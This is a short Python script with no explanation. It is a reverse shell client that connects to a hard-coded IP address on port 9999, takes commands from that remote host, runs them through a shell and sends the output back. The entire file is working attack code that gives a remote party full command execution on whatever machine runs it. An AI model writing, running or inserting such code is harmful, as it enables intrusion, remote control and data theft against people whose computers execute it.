import socket
import os
import subprocess

s = socket.socket()
host = "10.200.56.44"
port = 9999

s.connect((host, port))
currentDir = os.getcwd() + " >"
s.send(str.encode(currentDir))

while True :
	data = s.recv(1024)
	if len(data) > 0 :
		if data[:2].decode("utf-8") == "cd" :
			os.chdir(data[3:].decode("utf-8"))
			currentDir = os.getcwd() + " >"
			s.send(str.encode(currentDir))

		else :
			cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, 
				stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
			output_byte = cmd.stdout.read() + cmd.stderr.read()
			output_str = str(output_byte, "utf-8")
			currentDir = os.getcwd() + " >"
			s.send(str.encode(output_str + currentDir))

			print(output_str)
